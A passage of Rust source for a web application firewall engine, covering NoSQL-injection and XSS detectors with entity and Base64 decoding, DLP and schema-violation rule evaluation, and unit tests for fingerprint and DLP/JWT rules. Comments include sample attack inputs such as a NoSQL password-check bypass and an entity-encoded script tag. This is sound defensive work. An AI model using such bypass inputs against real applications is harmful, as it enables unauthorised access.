    // HIGH RISK: $where with JavaScript (can execute arbitrary code)
    if NOSQL_WHERE_JS.is_match(value) {
        return true;
    }

    // Authentication bypass attempts (e.g., {"password": {"$ne": null}})
    if NOSQL_AUTH_BYPASS.is_match(value) {
        return true;
    }

    // JSON prototype pollution (can lead to RCE in Node.js)
    if JSON_PROTO_POLLUTION.is_match(value) {
        return true;
    }

    // MongoDB operators (lower priority, more common in legitimate queries)
    NOSQL_MONGO_OPERATORS.is_match(value)
        || NOSQL_AGGREGATION.is_match(value)
        || NOSQL_COUCHDB.is_match(value)
        || NOSQL_REDIS.is_match(value)
        || NOSQL_CASSANDRA.is_match(value)
}

/// Analyzes a value for XSS patterns.
///
/// SECURITY: Decodes HTML entities before pattern matching to prevent bypass
/// via entity encoding (e.g., `&#60;script&#62;` instead of `<script>`).
fn xss_analyzer_score(value: &str) -> u32 {
    // First check the raw value
    if check_xss_patterns(value) {
        return 1;
    }

    // Decode HTML entities and check again
    let decoded = decode_html_entities(value);
    if decoded != value && check_xss_patterns(&decoded) {
        return 1;
    }

    // Try double-decoding for nested encoding attacks
    if decoded.contains('&') {
        let double_decoded = decode_html_entities(&decoded);
        if double_decoded != decoded && check_xss_patterns(&double_decoded) {
            return 1;
        }
    }

    0
}

/// Check XSS patterns against a value.
#[inline]
fn check_xss_patterns(value: &str) -> bool {
    XSS_SCRIPT.is_match(value)
        || XSS_JS_SCHEME.is_match(value)
        || XSS_ON_ATTR.is_match(value)
        || XSS_COOKIE.is_match(value)
        || XSS_IMG_SRC.is_match(value)
}

/// Decode HTML entities in a string.
///
/// Handles:
/// - Decimal entities: &#60; -> <
/// - Hexadecimal entities: &#x3C; or &#X3C; -> <
/// - Named entities: &lt; -> <, &gt; -> >, &amp; -> &, &quot; -> ", &apos; -> '
///
/// SECURITY: This is used to normalize input before XSS pattern matching
/// to prevent bypass via HTML entity encoding.
fn decode_html_entities(value: &str) -> String {
    if !value.contains('&') {
        return value.to_string();
    }

    let mut result = String::with_capacity(value.len());
    let mut chars = value.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '&' {
            let mut entity = String::new();
            let mut found_semicolon = false;

            // Collect entity characters (max 10 to prevent DoS)
            for _ in 0..10 {
                match chars.peek() {
                    Some(';') => {
                        chars.next();
                        found_semicolon = true;
                        break;
                    }
                    Some(&ch) if ch.is_ascii_alphanumeric() || ch == '#' => {
                        if let Some(next) = chars.next() {
                            entity.push(next);
                        } else {
                            break;
                        }
                    }
                    _ => break,
                }
            }

            if found_semicolon && !entity.is_empty() {
                if let Some(decoded) = decode_single_entity(&entity) {
                    result.push(decoded);
                    continue;
                }
            }

            // Not a valid entity, output as-is
            result.push('&');
            result.push_str(&entity);
            if found_semicolon {
                result.push(';');
            }
        } else {
            result.push(c);
        }
    }

    result
}

/// Decode a single HTML entity (without & and ;).
fn decode_single_entity(entity: &str) -> Option<char> {
    // Decimal: &#60;
    if let Some(num_str) = entity.strip_prefix('#') {
        // Hexadecimal: &#x3C; or &#X3C;
        if let Some(hex_str) = num_str
            .strip_prefix('x')
            .or_else(|| num_str.strip_prefix('X'))
        {
            if let Ok(code) = u32::from_str_radix(hex_str, 16) {
                return char::from_u32(code);
            }
        } else if let Ok(code) = num_str.parse::<u32>() {
            return char::from_u32(code);
        }
        return None;
    }

    // Named entities (common XSS-relevant ones)
    match entity {
        "lt" => Some('<'),
        "gt" => Some('>'),
        "amp" => Some('&'),
        "quot" => Some('"'),
        "apos" => Some('\''),
        "nbsp" => Some('\u{00A0}'),
        // Additional commonly abused entities
        "tab" | "Tab" => Some('\t'),
        "newline" | "NewLine" => Some('\n'),
        "colon" => Some(':'),
        "sol" => Some('/'),
        "equals" => Some('='),
        "lpar" => Some('('),
        "rpar" => Some(')'),
        "lsqb" | "lbrack" => Some('['),
        "rsqb" | "rbrack" => Some(']'),
        "lcub" | "lbrace" => Some('{'),
        "rcub" | "rbrace" => Some('}'),
        "semi" => Some(';'),
        "comma" => Some(','),
        "period" | "dot" => Some('.'),
        "excl" => Some('!'),
        "quest" => Some('?'),
        "num" => Some('#'),
        "percnt" => Some('%'),
        "plus" => Some('+'),
        "minus" | "dash" => Some('-'),
        "ast" | "midast" => Some('*'),
        "verbar" | "vert" => Some('|'),
        "bsol" => Some('\\'),
        "circ" => Some('^'),
        "grave" => Some('`'),
        "tilde" => Some('~'),
        "at" => Some('@'),
        _ => None,
    }
}

fn safe_percent_decode(value: &str) -> String {
    // Handle form encoding (+ -> space) first
    let replaced = value.replace('+', " ");
    percent_decode_str(&replaced)
        .decode_utf8()
        .map(|c| c.into_owned())
        .unwrap_or_else(|_| value.to_string())
}

fn decode_if_base64(value: &str) -> String {
    let sanitized = value.trim();
    if sanitized.len() < 8 {
        return value.to_string();
    }

    // Try standard Base64 first
    if let Ok(bytes) = BASE64_STANDARD.decode(sanitized.as_bytes()) {
        if let Ok(decoded) = String::from_utf8(bytes) {
            if !decoded.is_empty() {
                return decoded;
            }
        }
    }

    // Try URL-safe Base64 (common in web payloads)
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    if let Ok(bytes) = URL_SAFE_NO_PAD.decode(sanitized.as_bytes()) {
        if let Ok(decoded) = String::from_utf8(bytes) {
            if !decoded.is_empty() {
                return decoded;
            }
        }
    }

    value.to_string()
}

fn build_raw_request(ctx: &EvalContext) -> String {
    let mut out = String::new();
    out.push_str(&format!("{} {} HTTP/1.1", ctx.method, ctx.url));
    out.push('\n');
    for (key, value) in &ctx.headers {
        out.push_str(key);
        out.push_str(": ");
        out.push_str(value);
        out.push('\n');
    }
    out.push('\n');
    if let Some(body) = ctx.body_text {
        out.push_str(body);
    }
    out
}

fn extract_multipart_boundary(content_type: &str) -> Option<String> {
    content_type
        .split(';')
        .map(|p| p.trim())
        .find_map(|p| {
            let (key, value) = p.split_once('=')?;
            if key.trim().eq_ignore_ascii_case("boundary") {
                Some(value.trim().trim_matches('"').to_string())
            } else {
                None
            }
        })
        .filter(|b| !b.is_empty())
}

fn parse_multipart_values(raw_body: &[u8], boundary: &str) -> Vec<String> {
    let body = String::from_utf8_lossy(raw_body);
    let marker = format!("--{}", boundary);
    let mut out = Vec::new();
    for part in body.split(&marker) {
        let mut p = part.trim_matches('\r').trim_matches('\n').trim();
        if p.is_empty() || p == "--" {
            continue;
        }
        if p.starts_with("--") {
            continue;
        }
        if p.starts_with("\r\n") {
            p = &p[2..];
        }
        if let Some((_, rest)) = p.split_once("\r\n\r\n") {
            let value = rest.trim_end_matches("\r\n").trim().to_string();
            if !value.is_empty() {
                out.push(value);
            }
        }
    }
    out
}

fn select_argument_values(
    engine: &Engine,
    selector: Option<&MatchCondition>,
    ctx: &EvalContext,
) -> Vec<String> {
    let mut values = Vec::new();
    for entry in &ctx.arg_entries {
        if selector
            .map(|sel| matches_selector(engine, sel, &entry.key))
            .unwrap_or(true)
        {
            values.push(entry.value.clone());
        }
    }
    values
}

fn matches_selector(engine: &Engine, selector: &MatchCondition, candidate: &str) -> bool {
    match selector.kind.as_str() {
        "to_lowercase" => {
            let lowered = candidate.to_lowercase();
            selector
                .match_value
                .as_ref()
                .and_then(|m| m.as_cond())
                .map(|child| matches_selector(engine, child, &lowered))
                .unwrap_or(true)
        }
        "regex" => engine.eval_regex(selector.match_value.as_ref(), Some(candidate)),
        "hashset" => eval_hashset(selector.match_value.as_ref(), Some(candidate)),
        "multiple_contains" => {
            eval_multiple_contains(selector.match_value.as_ref(), Some(candidate))
        }
        "contains" => eval_contains(selector.match_value.as_ref(), Some(candidate)),
        "equals" => eval_equals(selector.match_value.as_ref(), Some(candidate)),
        _ => false,
    }
}

/// Numeric comparison helper shared by `dlp_violation` and `schema_violation`
/// match kinds. `op` defaults to `"gte"` when omitted, matching the most
/// common threshold-style rule.
fn compare_threshold(value: f64, op: Option<&str>, target: f64) -> bool {
    match op.unwrap_or("gte") {
        "gte" => value >= target,
        "gt" => value > target,
        "eq" => (value - target).abs() < f64::EPSILON,
        "neq" => (value - target).abs() >= f64::EPSILON,
        "lte" => value <= target,
        "lt" => value < target,
        _ => false,
    }
}

/// `dlp_violation` match kind. Counts DLP matches in `ctx.dlp_matches`,
/// optionally restricted to a specific data type via `field`, and compares
/// the count against `match` using `op` (default `gte`). Returns false
/// when no DLP scan results are available (i.e. during the body-phase pass).
///
/// Rule shapes supported:
///
/// ```json
/// { "type": "dlp_violation" }                             // ≥ 1 match of any type
/// { "type": "dlp_violation", "op": "gte", "match": 3 }    // ≥ 3 total matches
/// { "type": "dlp_violation", "field": "ssn", "match": 1 } // ≥ 1 SSN match
/// ```
fn eval_dlp_violation(condition: &MatchCondition, ctx: &EvalContext) -> bool {
    if ctx.dlp_matches.is_empty() {
        return false;
    }
    let count = match condition.field.as_deref() {
        Some(filter) => ctx
            .dlp_matches
            .iter()
            .filter(|m| m.data_type.as_str() == filter)
            .count() as f64,
        None => ctx.dlp_matches.len() as f64,
    };
    if count <= 0.0 {
        return false;
    }
    match condition.match_value.as_ref().and_then(|m| m.as_num()) {
        Some(target) => compare_threshold(count, condition.op.as_deref(), target),
        None => true,
    }
}

/// `schema_violation` match kind. Matches when the learned-schema validator
/// produced violations, optionally thresholded on `total_score`. Returns false
/// when no validation result is attached or the request validated cleanly.
///
/// Rule shapes supported:
///
/// ```json
/// { "type": "schema_violation" }                                 // any violation
/// { "type": "schema_violation", "op": "gte", "match": 15 }       // score ≥ 15
/// ```
fn eval_schema_violation(condition: &MatchCondition, ctx: &EvalContext) -> bool {
    let Some(result) = ctx.schema_result else {
        return false;
    };
    if result.is_valid() {
        return false;
    }
    let score = result.total_score as f64;
    match condition.match_value.as_ref().and_then(|m| m.as_num()) {
        Some(target) => compare_threshold(score, condition.op.as_deref(), target),
        None => true,
    }
}

/// Returns true if any condition in the subtree is a match kind whose value
/// only becomes available after the body-phase WAF pass (see `DEFERRED_MATCH_KINDS`).
fn condition_is_deferred(condition: &MatchCondition) -> bool {
    if DEFERRED_MATCH_KINDS.contains(&condition.kind.as_str()) {
        return true;
    }
    if let Some(mv) = condition.match_value.as_ref() {
        if let Some(child) = mv.as_cond() {
            if condition_is_deferred(child) {
                return true;
            }
        } else if let Some(arr) = mv.as_arr() {
            for item in arr {
                if let Some(child) = item.as_cond() {
                    if condition_is_deferred(child) {
                        return true;
                    }
                }
            }
        }
    }
    if let Some(selector) = condition.selector.as_ref() {
        if condition_is_deferred(selector) {
            return true;
        }
    }
    false
}

/// Compute the sorted list of rule indices that reference any deferred match
/// kind. Called at rule load time so the hot path can short-circuit on a
/// small `HashSet<u32>` lookup per rule.
fn compute_deferred_rule_indices(rules: &[WafRule]) -> Vec<usize> {
    let mut out = Vec::new();
    for (idx, rule) in rules.iter().enumerate() {
        if rule
            .matches
            .iter()
            .any(|cond| condition_is_deferred(cond))
        {
            out.push(idx);
        }
    }
    out
}

fn collect_regex_patterns(condition: &MatchCondition, out: &mut Vec<String>) {
    if condition.kind == "regex" {
        if let Some(MatchValue::Str(s)) = condition.match_value.as_ref() {
            out.push(s.clone());
        }
    }
    if let Some(mv) = condition.match_value.as_ref() {
        if let Some(child) = mv.as_cond() {
            collect_regex_patterns(child, out);
        } else if let Some(arr) = mv.as_arr() {
            for item in arr {
                if let Some(child) = item.as_cond() {
                    collect_regex_patterns(child, out);
                }
            }
        }
    }
    if let Some(selector) = condition.selector.as_ref() {
        collect_regex_patterns(selector, out);
    }
}

fn collect_word_values(condition: &MatchCondition, out: &mut Vec<String>) {
    if condition.kind == "word" {
        if let Some(MatchValue::Str(s)) = condition.match_value.as_ref() {
            out.push(s.clone());
        }
    }
    if let Some(mv) = condition.match_value.as_ref() {
        if let Some(child) = mv.as_cond() {
            collect_word_values(child, out);
        } else if let Some(arr) = mv.as_arr() {
            for item in arr {
                if let Some(child) = item.as_cond() {
                    collect_word_values(child, out);
                }
            }
        }
    }
    if let Some(selector) = condition.selector.as_ref() {
        collect_word_values(selector, out);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dlp::{DlpMatch, PatternSeverity, SensitiveDataType};
    use crate::fingerprint::{ClientFingerprint, Ja4Fingerprint, Ja4Protocol, Ja4SniType, Ja4hFingerprint};
    use crate::profiler::{SchemaViolation, ValidationResult};
    use crate::waf::types::Header;

    fn sample_fingerprint(ja4_raw: &str, ja4h_raw: &str) -> ClientFingerprint {
        ClientFingerprint {
            ja4: Some(Ja4Fingerprint {
                raw: ja4_raw.to_string(),
                protocol: Ja4Protocol::TCP,
                tls_version: 13,
                sni_type: Ja4SniType::Domain,
                cipher_count: 15,
                ext_count: 16,
                alpn: "h2".to_string(),
                cipher_hash: "aaaaaaaaaaaa".to_string(),
                ext_hash: "bbbbbbbbbbbb".to_string(),
            }),
            ja4h: Ja4hFingerprint {
                raw: ja4h_raw.to_string(),
                method: "ge".to_string(),
                http_version: 11,
                has_cookie: false,
                has_referer: false,
                accept_lang: "en".to_string(),
                header_hash: "cccccccccccc".to_string(),
                cookie_hash: "000000000000".to_string(),
            },
            combined_hash: "deadbeefcafef00d".to_string(),
        }
    }

    fn dlp_match(data_type: SensitiveDataType) -> DlpMatch {
        DlpMatch {
            pattern_name: "test",
            data_type,
            severity: PatternSeverity::High,
            masked_value: "***".to_string(),
            start: 0,
            end: 3,
            stream_offset: None,
        }
    }

    #[test]
    fn test_empty_engine() {
        let engine = Engine::empty();
        assert_eq!(engine.rule_count(), 0);
    }

    #[test]
    fn test_ja4_substring_match_fires() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9001,
            "description": "Block python-requests TLS stack",
            "risk": 50.0,
            "blocking": true,
            "matches": [{"type": "ja4", "match": "t13d1516"}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let fp = sample_fingerprint("t13d1516h2_8daaf6152771_e5627efa2ab1", "ge11nn00_abcdef012345_000000000000");
        let verdict = engine.analyze(&Request {
            method: "GET",
            path: "/",
            client_ip: "1.2.3.4",
            fingerprint: Some(&fp),
            ..Default::default()
        });

        assert_eq!(verdict.action, Action::Block);
        assert!(verdict.matched_rules.contains(&9001));
    }

    #[test]
    fn test_ja4_absent_does_not_match() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9002,
            "description": "Block any TLS",
            "risk": 10.0,
            "blocking": true,
            "matches": [{"type": "ja4", "match": "t13"}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // No fingerprint attached → rule must not fire.
        let verdict = engine.analyze(&Request {
            method: "GET",
            path: "/",
            client_ip: "1.2.3.4",
            ..Default::default()
        });

        assert_eq!(verdict.action, Action::Allow);
        assert!(verdict.matched_rules.is_empty());
    }

    #[test]
    fn test_ja4h_substring_match_fires() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9003,
            "description": "Detect cookieless GET",
            "risk": 5.0,
            "blocking": false,
            "matches": [{"type": "ja4h", "match": "ge11nn"}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let fp = sample_fingerprint("t13d1516h2_8daaf6152771_e5627efa2ab1", "ge11nn00_abcdef012345_000000000000");
        let verdict = engine.analyze(&Request {
            method: "GET",
            path: "/",
            client_ip: "1.2.3.4",
            fingerprint: Some(&fp),
            ..Default::default()
        });

        assert!(verdict.matched_rules.contains(&9003));
    }

    #[test]
    fn test_schema_violation_threshold() {
        // This test pins the `schema_violation` match kind's threshold
        // comparison semantics: the rule fires when total_score >= threshold
        // and does NOT fire when total_score < threshold. It intentionally
        // does NOT rely on ValidationResult::add() accumulating from per-
        // violation severity defaults in schema_types.rs, because those
        // defaults are expected to be tuned as the schema learner evolves.
        // Instead we construct ValidationResult via struct literal with an
        // explicit total_score, which isolates the test from severity-score
        // changes and makes it fail for the right reason if the threshold
        // comparison itself regresses.
        //
        // The threshold value (20) is arbitrary — only the above/below
        // relationship to the two constructed scores (25 and 15) matters.
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9004,
            "description": "Block on severe schema deviation",
            "risk": 40.0,
            "blocking": true,
            "matches": [{"type": "schema_violation", "op": "gte", "match": 20}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // One sample violation so `is_valid()` returns false. Its own
        // severity score is irrelevant because we override total_score
        // directly via the struct literal below.
        let sample_violation = SchemaViolation::unexpected_field("/foo");

        // Above the threshold: score 25, rule wants >= 20. Must fire.
        let above = ValidationResult {
            violations: vec![sample_violation.clone()],
            total_score: 25,
        };
        let verdict_above = engine.analyze(&Request {
            method: "POST",
            path: "/api/users",
            client_ip: "1.2.3.4",
            schema_result: Some(&above),
            ..Default::default()
        });
        assert_eq!(verdict_above.action, Action::Block);
        assert!(verdict_above.matched_rules.contains(&9004));

        // Below the threshold: score 15, rule wants >= 20. Must NOT fire.
        // This is the negative assertion the original test was missing —
        // the original only checked "above threshold" and "no schema_result",
        // neither of which actually exercises the threshold comparison.
        let below = ValidationResult {
            violations: vec![sample_violation.clone()],
            total_score: 15,
        };
        let verdict_below = engine.analyze(&Request {
            method: "POST",
            path: "/api/users",
            client_ip: "1.2.3.4",
            schema_result: Some(&below),
            ..Default::default()
        });
        assert_eq!(verdict_below.action, Action::Allow);
        assert!(!verdict_below.matched_rules.contains(&9004));

        // No schema_result attached: the match kind returns false early.
        let verdict_empty = engine.analyze(&Request {
            method: "POST",
            path: "/api/users",
            client_ip: "1.2.3.4",
            ..Default::default()
        });
        assert_eq!(verdict_empty.action, Action::Allow);
    }

    #[test]
    fn test_dlp_violation_is_deferred_not_body_phase() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9005,
            "description": "Block >= 2 DLP hits",
            "risk": 60.0,
            "blocking": true,
            "matches": [{"type": "dlp_violation", "op": "gte", "match": 2}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // The rule must be tagged as deferred at load time.
        assert_eq!(engine.deferred_rule_indices.len(), 1);
        assert!(engine.deferred_rule_id_set.contains(&9005));

        // Body-phase `analyze` must skip the deferred rule even if DLP matches
        // were (erroneously) available — the index set blocks it.
        let matches = vec![dlp_match(SensitiveDataType::Ssn), dlp_match(SensitiveDataType::Ssn)];
        let req = Request {
            method: "POST",
            path: "/api",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&matches),
            ..Default::default()
        };
        let verdict = engine.analyze(&req);
        assert_eq!(verdict.action, Action::Allow);
        assert!(verdict.matched_rules.is_empty());

        // The deferred pass must see the same rule and fire.
        let deferred = engine.analyze_deferred_with_timeout(&req, DEFAULT_EVAL_TIMEOUT);
        assert_eq!(deferred.action, Action::Block);
        assert!(deferred.matched_rules.contains(&9005));
    }

    #[test]
    fn test_dlp_violation_type_filter() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9006,
            "description": "Block on any SSN leak",
            "risk": 80.0,
            "blocking": true,
            "matches": [{"type": "dlp_violation", "field": "ssn", "op": "gte", "match": 1}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // Credit card match should not count against an SSN filter.
        let only_cc = vec![dlp_match(SensitiveDataType::CreditCard)];
        let req_cc = Request {
            method: "POST",
            path: "/pay",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&only_cc),
            ..Default::default()
        };
        let verdict_cc = engine.analyze_deferred_with_timeout(&req_cc, DEFAULT_EVAL_TIMEOUT);
        assert_eq!(verdict_cc.action, Action::Allow);

        // SSN match triggers the rule.
        let ssn = vec![dlp_match(SensitiveDataType::Ssn)];
        let req_ssn = Request {
            method: "POST",
            path: "/pay",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&ssn),
            ..Default::default()
        };
        let verdict_ssn = engine.analyze_deferred_with_timeout(&req_ssn, DEFAULT_EVAL_TIMEOUT);
        assert_eq!(verdict_ssn.action, Action::Block);
        assert!(verdict_ssn.matched_rules.contains(&9006));
    }

    #[test]
    fn test_deferred_pass_empty_without_deferred_rules() {
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 1,
            "description": "Non-deferred rule",
            "risk": 10.0,
            "blocking": true,
            "matches": [{"type": "uri", "match": {"type": "contains", "match": "evil"}}]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        assert!(engine.deferred_rule_indices.is_empty());

        let verdict = engine.analyze_deferred_with_timeout(
            &Request::default(),
            DEFAULT_EVAL_TIMEOUT,
        );
        assert_eq!(verdict.action, Action::Allow);
        assert!(verdict.matched_rules.is_empty());
    }

    /// TASK-45 compat check: load the full embedded production ruleset
    /// through the current Engine and assert it parses without error and
    /// produces the expected rule count. This is the load-time regression
    /// gate — if a future engine change breaks the production rule schema
    /// in any way, this test fails loudly with a line-level error message
    /// from serde_json rather than silently degrading at proxy startup.
    #[test]
    fn test_production_rules_load_into_current_engine() {
        const PRODUCTION_RULES: &str = include_str!("../production_rules.json");

        let mut engine = Engine::empty();
        let count = engine
            .load_rules(PRODUCTION_RULES.as_bytes())
            .expect("production_rules.json must parse against the current Engine schema");

        // Lower bound: TASK-45 restored 237 rules from archive; TASK-46
        // added 11 more signal-correlation rules (220001-220021) for the
        // ja4/dlp_violation/schema_violation match kinds, for a total
        // floor of 248. Using >= rather than == so the file can grow
        // over time without breaking the test — bump the floor when
        // adding more rules.
        assert!(
            count >= 248,
            "expected >= 248 rules from production_rules.json, got {}",
            count
        );
        assert_eq!(
            engine.rule_count(),
            count,
            "Engine::rule_count() must match load_rules return value"
        );

        // Rule IDs must all be unique — a duplicated id would make
        // matched_rules ordering non-deterministic and would suggest the
        // archive copy was accidentally concatenated with itself.
        let rules: Vec<WafRule> = serde_json::from_str(PRODUCTION_RULES)
            .expect("production_rules.json must be valid JSON array");
        let mut ids: Vec<u32> = rules.iter().map(|r| r.id).collect();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(
            ids.len(),
            rules.len(),
            "production_rules.json must have unique rule ids — got {} rules but only {} unique ids",
            rules.len(),
            ids.len()
        );
    }

    // ────────────────────────────────────────────────────────────────────
    // TASK-46 signal-correlation rule coverage.
    //
    // Each of the three tests below loads the FULL production_rules.json
    // (via include_str!) into a local Engine and exercises the relevant
    // signal match kind against the specific rule ids from the 220000
    // block. This proves both that the rule is present in production
    // AND that it fires on its intended trigger AND that a benign
    // baseline request does not trigger it.
    //
    // Tests use a local Engine rather than the global SYNAPSE so they
    // don't need #[serial] coordination with other tests that mutate
    // the global engine state.
    // ────────────────────────────────────────────────────────────────────

    const PRODUCTION_RULES_FOR_SIGNAL_TESTS: &str =
        include_str!("../production_rules.json");

    /// Load the full production ruleset into a fresh local engine for
    /// signal-correlation rule-fire tests. Used by the three test
    /// functions below.
    fn load_production_rules_engine() -> Engine {
        let mut engine = Engine::empty();
        engine
            .load_rules(PRODUCTION_RULES_FOR_SIGNAL_TESTS.as_bytes())
            .expect("production_rules.json must load");
        engine
    }

    #[test]
    fn test_signal_correlation_dlp_rules_fire_on_intended_triggers() {
        let engine = load_production_rules_engine();

        // Helper: run the deferred pass with a given match vec and return
        // the matched_rules set. All dlp_violation rules are tagged
        // deferred at load time, so we must use analyze_deferred_with_timeout
        // rather than analyze() — body-phase would skip them entirely.
        let run = |matches: &[DlpMatch]| -> Vec<u32> {
            let req = Request {
                method: "POST",
                path: "/api/submit",
                client_ip: "1.2.3.4",
                dlp_matches: Some(matches),
                ..Default::default()
            };
            engine
                .analyze_deferred_with_timeout(&req, DEFAULT_EVAL_TIMEOUT)
                .matched_rules
        };

        // Helper: synthesize a DlpMatch with a specific data_type. The
        // DLP match kind filters by data_type string, so the type is
        // load-bearing — severity and masked_value are not.
        fn typed_match(dt: SensitiveDataType) -> DlpMatch {
            DlpMatch {
                pattern_name: "test",
                data_type: dt,
                severity: PatternSeverity::High,
                masked_value: "***".to_string(),
                start: 0,
                end: 3,
                stream_offset: None,
            }
        }

        // Rule 220001: mass DLP leak — any 5 matches of any type.
        // Five SSN matches should trip both 220001 AND 220006 (mass SSN
        // at >=3), so we check 220001 is among the matched rules but
        // don't demand exclusivity.
        let mass = vec![
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
        ];
        let hits = run(&mass);
        assert!(
            hits.contains(&220001),
            "220001 (mass DLP leak >=5) must fire on 5 matches, got {:?}",
            hits
        );

        // Rule 220002: any api_key match in request body.
        let hits = run(&[typed_match(SensitiveDataType::ApiKey)]);
        assert!(
            hits.contains(&220002),
            "220002 (api_key in body) must fire on 1 api_key match"
        );

        // Rule 220003: any aws_key match.
        let hits = run(&[typed_match(SensitiveDataType::AwsKey)]);
        assert!(
            hits.contains(&220003),
            "220003 (aws_key in body) must fire on 1 aws_key match"
        );

        // Rule 220004: any private_key match.
        let hits = run(&[typed_match(SensitiveDataType::PrivateKey)]);
        assert!(
            hits.contains(&220004),
            "220004 (private_key in body) must fire on 1 private_key match"
        );

        // Rule 220005: any jwt match in body. Non-blocking since TASK-62
        // (was blocking=true, downgraded to risk contribution to avoid
        // OAuth/OIDC false positives). The rule still fires and appears
        // in matched_rules, so this assertion is unchanged. The separate
        // test `test_rule_220005_jwt_in_body_is_non_blocking_after_task_62`
        // pins the non-blocking behavior specifically.
        let hits = run(&[typed_match(SensitiveDataType::Jwt)]);
        assert!(
            hits.contains(&220005),
            "220005 (jwt in body) must fire on 1 jwt match"
        );

        // Rule 220006: mass SSN (>=3). Exactly 3 SSNs should fire 220006
        // but NOT 220001 (which needs >=5).
        let three_ssn = vec![
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
            typed_match(SensitiveDataType::Ssn),
        ];
        let hits = run(&three_ssn);
        assert!(
            hits.contains(&220006),
            "220006 (mass SSN >=3) must fire on 3 SSNs"
        );
        assert!(
            !hits.contains(&220001),
            "220001 must NOT fire on only 3 matches"
        );

        // Rule 220007: mass credit_card (>=3).
        let three_cc = vec![
            typed_match(SensitiveDataType::CreditCard),
            typed_match(SensitiveDataType::CreditCard),
            typed_match(SensitiveDataType::CreditCard),
        ];
        let hits = run(&three_cc);
        assert!(
            hits.contains(&220007),
            "220007 (mass credit_card >=3) must fire on 3 PANs"
        );

        // Negative baseline: a single email match (plausibly legitimate)
        // must not fire any of the DLP credential/PII rules.
        let benign = vec![typed_match(SensitiveDataType::Email)];
        let hits = run(&benign);
        for rule_id in [220001, 220002, 220003, 220004, 220005, 220006, 220007] {
            assert!(
                !hits.contains(&rule_id),
                "{} must NOT fire on a single benign email match; got {:?}",
                rule_id,
                hits
            );
        }
    }

    /// TASK-62: rule 220005 (JWT in body) was originally blocking=true with
    /// risk=70, which would brick OAuth2 refresh-token flows, OIDC
    /// back-channel logout, Apple/Google form-POST ID token callbacks, and
    /// SAML-bearer exchange endpoints. Downgraded to non-blocking risk
    /// contribution (blocking=false, risk=30) so the detection still surfaces
    /// in entity risk and observability but does not produce a hard 403 on
    /// its own.
    ///
    /// This test pins the non-blocking behavior: a request that trips ONLY
    /// rule 220005 must produce `Action::Allow`, not `Action::Block`. The
    /// pre-existing `test_signal_correlation_dlp_rules_fire_on_intended_triggers`
    /// asserts that 220005 appears in `matched_rules` on a JWT input (still
    /// correct after TASK-62), but it doesn't verify the verdict action.
    /// This test closes that gap.
    ///
    /// If someone re-enables blocking on 220005 without replacing this test,
    /// the assertion fails with a precise message pointing at TASK-62 and
    /// the OAuth/OIDC false-positive concern.
    #[test]
    fn test_rule_220005_jwt_in_body_is_non_blocking_after_task_62() {
        let engine = load_production_rules_engine();

        // Fabricate a request with ONLY a JWT DLP match — no other signals.
        // The deferred pass should evaluate rule 220005 against this, mark
        // it as matched, but NOT produce a blocking verdict.
        let jwt_match = DlpMatch {
            pattern_name: "test",
            data_type: SensitiveDataType::Jwt,
            severity: PatternSeverity::High,
            masked_value: "***".to_string(),
            start: 0,
            end: 3,
            stream_offset: None,
        };
        let matches = vec![jwt_match];
        let req = Request {
            method: "POST",
            // Common OAuth callback path. The rule isn't path-scoped, but
            // using this path documents the FP scenario the downgrade
            // protects against.
            path: "/oauth/token",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&matches),
            ..Default::default()
        };

        let verdict = engine.analyze_deferred_with_timeout(&req, DEFAULT_EVAL_TIMEOUT);

        // The rule must still fire (detection still surfaces for
        // observability and entity risk accumulation).
        assert!(
            verdict.matched_rules.contains(&220005),
            "TASK-62: rule 220005 must still fire on JWT-in-body as a non-blocking signal; matched_rules={:?}",
            verdict.matched_rules
        );

        // The verdict must be Allow, not Block. This is the TASK-62
        // guarantee: JWT-in-body alone does not block. If any future
        // refactor re-enables blocking on 220005, this assertion fails
        // with a clear pointer to the OAuth/OIDC false-positive concern.
        assert_eq!(
            verdict.action,
            Action::Allow,
            "TASK-62: rule 220005 (JWT in body) must be non-blocking. \
             If it blocks, OAuth/OIDC refresh-token flows, Apple/Google \
             form-POST callbacks, and SAML-bearer exchanges will 403 on \
             legitimate traffic. See TASK-62 for the list of affected flows."
        );

        // Sanity: risk score is non-zero (the rule contributed to risk).
        // 220005 is risk=30 after TASK-62.
        assert!(
            verdict.risk_score >= 30,
            "TASK-62: rule 220005 risk contribution must be at least 30 \
             (current value). Got risk_score={}.",
            verdict.risk_score
        );
    }

    #[test]
    fn test_signal_correlation_schema_rules_fire_on_intended_triggers() {
        let engine = load_production_rules_engine();
        let sample_violation = SchemaViolation::unexpected_field("/tampered_field");

        // Helper: build a ValidationResult with an explicit score and
        // run it through body-phase analyze. Schema rules are NOT
        // deferred, so analyze() is correct here.
        let run = |score: u32| -> (Action, Vec<u32>) {
            let result = ValidationResult {
                violations: vec![sample_violation.clone()],
                total_score: score,
            };
            let req = Request {
                method: "POST",
                path: "/api/items",
                client_ip: "1.2.3.4",
                schema_result: Some(&result),
                ..Default::default()
            };
            let verdict = engine.analyze(&req);
